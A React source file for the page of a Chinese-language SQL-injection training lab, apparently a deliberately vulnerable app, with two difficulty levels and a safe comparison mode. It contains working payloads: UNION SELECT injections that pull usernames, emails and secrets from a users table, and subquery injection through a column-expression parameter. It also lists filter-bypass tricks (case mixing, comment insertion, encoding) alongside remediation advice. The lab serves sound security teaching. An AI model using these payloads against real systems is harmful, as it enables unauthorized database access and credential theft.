import { Form, Input, Button, Tag, Space, Typography, Select, Divider } from 'antd';
import { BugOutlined, SafetyOutlined, PlayCircleOutlined } from '@ant-design/icons';
import { sqliApi } from '../../utils/api';
import useRequestRunner from '../../hooks/useRequestRunner';
import ThreePanelLab from '../../components/ThreePanelLab';
import LabTips from '../../components/LabTips';
import { useMemo, useState } from 'react';
import MetaTags from '../../components/MetaTags';

const { Text } = Typography;

const PAYLOADS_L1 = [
  "%' ORDER BY 3-- ",
  "%' ORDER BY 4-- ",
  "%' UNION SELECT username, email, NULL FROM users-- ",
  "%' UNION SELECT username, email, CAST(CURRENT_TIMESTAMP AS TIMESTAMP) FROM users-- ",
  "%' UNION SELECT username, secret, NULL FROM users-- ",
];

const TITLE_MODE_OPTIONS = [
  { value: 'raw', label: 'raw（原样）' },
  { value: 'lower', label: 'lower（LOWER(title)）' },
  { value: 'upper', label: 'upper（UPPER(title)）' },
];

const PAYLOADS_L2 = [
  // 先验证结构位可控（无害表达式）
  'title',
  "CONCAT('X-', title)",
  "COALESCE(title, 'X')",
  // 再转向视图回显（必须是标量子查询）
  '(SELECT alias_username FROM vw_accounts LIMIT 1)',
  '(SELECT alias_email FROM vw_accounts LIMIT 1)',
  // 类型/序列化排坑：显式转字符串
  'CAST((SELECT alias_created_at FROM vw_accounts LIMIT 1) AS VARCHAR)',
];

const TIPS_L1 = {
  principle:
    "难度 1 演示“值位置注入”：后端把 q 直接拼进 LIKE 字符串，导致闭合引号后可用 ORDER BY 探测列数，再用 UNION 跨表回显（username/email → title/snippet）。",
  exploit: [
    {
      title: '基线：空 q（只看到公开新闻）',
      desc: 'q 为空时，应只返回公开新闻（LIMIT 5）。',
      payloads: ['q: （空）'],
    },
    {
      title: '先探测列数：ORDER BY 列序号',
      desc: '先不做 UNION，直接用 ORDER BY N 探测原始 SELECT 的列数。本关卡固定为 3 列：ORDER BY 3 往往正常，ORDER BY 4 往往报错（靶场对外不回显细节）。',
      payloads: ["q: %' ORDER BY 3-- ", "q: %' ORDER BY 4-- "],
    },
    {
      title: '再做 UNION：跨表回显',
      desc: '确认“需要 3 列”后再拼 UNION。第三列用于对齐 created_at 类型（H2 下优先 NULL 或显式 CAST）。',
      payloads: [
        "q: %' UNION SELECT username, email, NULL FROM users-- ",
        "q: %' UNION SELECT username, email, CAST(CURRENT_TIMESTAMP AS TIMESTAMP) FROM users-- ",
        "q: %' UNION SELECT username, secret, NULL FROM users-- ",
      ],
    },
  ],
  bypassIntro:
    '难度 1 常见弱防护是黑名单过滤（拦 UNION/--/单引号/空格）。黑名单很脆弱，常被大小写、注释与空白变体绕过。',
  bypass: [
    '大小写/混淆：UnIoN、uNiOn（取决于过滤是否大小写敏感）',
    '注释插入：UN/**/ION、--+（取决于数据库/解析器）',
    '空白变体：TAB/换行/多空格',
    '编码：URL 编码（%25 %27 %2d%2d 等），取决于解码时机',
  ],
  fix: [
    '参数化 LIKE：`title LIKE ?` 并绑定 `%q%`（SAFE 已实现）。',
    '不要把用户输入拼到 SQL 字符串（包括引号、注释、UNION 等结构片段）。',
    '生产环境统一错误处理：不回显 SQL/堆栈；靶场可用服务端日志做对照教学。',
  ],
  profile: [
    "H2（当前环境）：NULL/CAST(TIMESTAMP) 常用于 UNION 类型对齐；注释常用 `-- `（末尾空格）。",
  ],
};

const TIPS_L2 = {
  principle:
    "难度 2 演示“结构位置注入”：q 已参数化（只能当数据匹配），但 VULN 路由把 titleExpr 直接拼进 SELECT 列表达式：`SELECT <titleExpr> AS title ...`。学员需要先确保 q 命中，再把 titleExpr 变成可控表达式/标量子查询，从 vw_accounts(alias_username/alias_email/alias_created_at) 视图回显数据。",
  exploit: [
    {
      title: '起点确认：q 仍然决定有没有行返回',
      desc: '如果 q 没命中任何新闻标题，结果为空属于正常现象；此时 titleExpr 再强也看不到回显。',
      payloads: ['q: 公开 / 新闻 / OWASP（先保证能返回 1-5 条）'],
    },
    {
      title: '验证结构位可控：先用无害表达式',
      desc: '先证明 titleExpr 影响“回显列”，不是过滤条件。用肉眼可见变化的表达式更直观。',
      payloads: ["titleExpr: title", "titleExpr: CONCAT('X-', title)", "titleExpr: COALESCE(title, 'X')"],
    },
    {
      title: '跨表目标：视图别名（vw_accounts）',
      desc: '构造标量子查询，把视图字段渲染到 title。注意必须返回单值（单行单列）。',
      payloads: [
        'titleExpr: (SELECT alias_username FROM vw_accounts LIMIT 1)',
        'titleExpr: (SELECT alias_email FROM vw_accounts LIMIT 1)',
      ],
    },
    {
      title: '类型/序列化排坑：显式 CAST 成字符串',
      desc: '当表达式返回非文本类型时，可能触发转换/序列化差异；用 CAST 统一到 VARCHAR。',
      payloads: ['titleExpr: CAST((SELECT alias_created_at FROM vw_accounts LIMIT 1) AS VARCHAR)'],
    },
  ],
  bypassIntro:
    '难度 2 的弱防护常见于“只拦 q 的黑名单”，但真正入口在结构位 titleExpr。即使加了黑名单，也常被大小写/注释/拼接绕过；更稳的是不暴露任意表达式能力。',
  bypass: [
    '入口迁移：当 q 不能改结构时，转向 titleExpr（结构位）',
    '同义表达式：COALESCE/CASE 等可替代部分被拦写法',
    '拼接构词：CONCAT/||（取决于方言）替代直写',
  ],
  fix: [
    '（与难度1不同）难度2要修的是结构位：不要接收任意 titleExpr；只接受枚举键（titleMode/titleTransform），服务端 switch 映射到固定表达式（title/LOWER(title)/UPPER(title)）。',
    '结构模板化：参数化只能绑定值，不能绑定列名/函数名/表达式；SELECT/ORDER BY 等结构必须由服务端模板决定。',
    '把“高级表达式/自定义渲染”改为服务端配置（非客户端参数），并做审计记录（不回显到客户端）。',
  ],
  profile: [
    "H2（当前环境）：字符串拼接常用 CONCAT；文本类型可 CAST(... AS VARCHAR)；LIMIT 可用。",
    "MySQL：字符串拼接用 CONCAT；文本 CAST(... AS CHAR)；时间/类型转换与 H2 不同。",
    "Postgres：字符串拼接常用 `||`；文本 CAST(... AS TEXT)；子查询/函数细节与 H2 有差异。",
  ],
};

export default function SqliNewsUnion() {
  const { loading, result, run } = useRequestRunner();
  const [vulnForm] = Form.useForm();
  const [mode, setMode] = useState('vuln'); // vuln | safe
  const [difficulty, setDifficulty] = useState('1'); // '1' | '2'

  const modeUi = useMemo(() => {
    return mode === 'safe'
      ? {
          label: 'SAFE',
          icon: <SafetyOutlined style={{ color: '#34d399' }} />,
          tag: <Tag color="green">{difficulty === '2' ? '白名单映射' : '参数化 LIKE'}</Tag>,
          buttonDanger: false,
          runType: difficulty === '2' ? 'safeNewsAdv' : 'safeNewsUnion',
          request: (values) => {
            const q = values?.q || '';
            if (difficulty === '2') {
              const titleMode = values?.titleMode || 'raw';
              return sqliApi.safeNewsAdvSearch(q, titleMode);
            }
            return sqliApi.safeNewsUnionSearch(q);
          },
        }
      : {
          label: 'VULN',
          icon: <BugOutlined style={{ color: '#94a3b8' }} />,
          tag: <Tag color="volcano">{difficulty === '2' ? '结构位表达式' : 'LIKE 拼接'}</Tag>,
          buttonDanger: true,
          runType: difficulty === '2' ? 'vulnNewsAdv' : 'vulnNewsUnion',
          request: (values) => {
            const q = values?.q || '';
            if (difficulty === '2') {
              const titleMode = values?.titleMode || 'raw';
              const titleExpr = values?.titleExpr || undefined;
              return sqliApi.vulnNewsAdvSearch(q, titleMode, titleExpr);
            }
            return sqliApi.vulnNewsUnionSearch(q);
          },
        };
  }, [mode, difficulty]);

  const raw = result?.data?.data;
  const items = Array.isArray(raw?.items) ? raw.items : [];
  const count = typeof raw?.count === 'number' ? raw.count : items.length;
  const meta = result?.data?.meta;
  const payloads = difficulty === '2' ? PAYLOADS_L2 : PAYLOADS_L1;
  const tips = difficulty === '2' ? TIPS_L2 : TIPS_L1;

  return (
    <ThreePanelLab
      title="SQL 注入 · 新闻搜索"
      subtitle={
        difficulty === '2'
          ? '难度 2：结构位表达式（q 参数化安全）。关卡：news_adv_func_view（inband）。'
          : '难度 1：LIKE 注入 + UNION 跨表回显。关卡：news_union_users（inband）。'
      }
      bottomExtra={<LabTips tips={tips} />}
      hideSafe
      hideResponse
      vuln={{
        title: (
          <Space>
            {modeUi.icon}
            <span style={{ color: '#e6edf3' }}>{modeUi.label}</span>
          </Space>
        ),
        extra: (
          <Space wrap>
            <Select
              size="small"
              value={difficulty}
              onChange={(v) => {
                setDifficulty(v);
                // 切难度时，尽量回到合理默认
                if (v === '1') {
                  vulnForm.setFieldsValue({ titleMode: 'raw', titleExpr: undefined });
                } else {
                  vulnForm.setFieldsValue({ titleMode: 'raw' });
                }
              }}
              options={[
                { value: '1', label: '难度 1' },
                { value: '2', label: '难度 2' },
              ]}
              style={{ width: 110 }}
            />
            <Select
              size="small"
              value={mode}
              onChange={(v) => setMode(v)}
              options={[
                { value: 'vuln', label: 'VULN' },
                { value: 'safe', label: 'SAFE' },
              ]}
              style={{ width: 110 }}
            />
            {modeUi.tag}
            <MetaTags meta={meta} />
          </Space>
        ),
        children: (
          <>
            <Form
              form={vulnForm}
              layout="vertical"
              initialValues={{ titleMode: 'raw' }}
              onFinish={(v) => run(modeUi.runType, () => modeUi.request(v))}
            >
              <Form.Item name="q" label={difficulty === '2' ? 'q（搜索关键词）' : 'q（搜索关键词 / 注入点）'}>
                <Input placeholder={difficulty === '2' ? '默认空；关键词参与 LIKE（参数化）' : '默认空；或粘贴 UNION payload（见下方）'} />
              </Form.Item>

              {difficulty === '2' && (
                <>
                  <Form.Item name="titleMode" label="titleMode（展示变体）">
                    <Select options={TITLE_MODE_OPTIONS} />
                  </Form.Item>

                  {mode === 'vuln' && (
                    <Form.Item name="titleExpr" label="titleExpr（高级表达式，仅 VULN）">
                      <Input placeholder="留空=按 titleMode；或输入表达式/子查询（如 LOWER(title) / (SELECT alias_username FROM vw_accounts LIMIT 1)）" />
                    </Form.Item>
                  )}

                  <Divider style={{ margin: '8px 0 12px', borderColor: '#2d3a4d' }} />
                </>
              )}
              <Form.Item>
                <Button
                  type="primary"
                  danger={modeUi.buttonDanger}
                  htmlType="submit"
                  loading={loading}
                  icon={<PlayCircleOutlined />}
                >
                  搜索
                </Button>
              </Form.Item>
            </Form>

            {/* 更贴近真实：搜索后立刻展示“新闻列表” */}
            {items.length > 0 && (
              <div style={{ marginTop: 8, marginBottom: 12 }}>
                <Text type="secondary" style={{ fontSize: 12 }}>
                  搜索结果（{count}）
                </Text>
                <div style={{ marginTop: 8 }}>
                  {items.map((x, idx) => (
                    <div
                      key={String(x?.title ?? '') + String(x?.snippet ?? '') + idx}
                      style={{
                        padding: '10px 0',
                        borderBottom: idx === items.length - 1 ? 'none' : '1px solid #2d3a4d',
                      }}
                    >
                      <div style={{ color: '#e6edf3', fontWeight: 600, marginBottom: 4 }}>{x?.title}</div>
                      <div style={{ color: '#8b9cb3' }}>{x?.snippet}</div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            <Text type="secondary" style={{ fontSize: 12 }}>
              {difficulty === '2' ? '常用示例（点击填充 titleExpr + 复制）:' : '常用示例（点击填充 q + 复制）:'}
            </Text>
            <div style={{ marginTop: 8 }}>
              {payloads.map((p) => (
                <Tag
                  key={p}
                  style={{ cursor: 'pointer', marginBottom: 6, fontFamily: 'JetBrains Mono, monospace' }}
                  onClick={async () => {
                    if (difficulty === '2') {
                      vulnForm.setFieldsValue({ titleExpr: p });
                    } else {
                      vulnForm.setFieldsValue({ q: p });
                    }
                    try {
                      await navigator.clipboard.writeText(p);
                    } catch {
                      // ignore
                    }
                  }}
                >
                  {p}
                </Tag>
              ))}
            </div>
          </>
        ),
      }}
      safe={{ title: null, extra: null, children: null }}
      result={result}
    />
  );
}

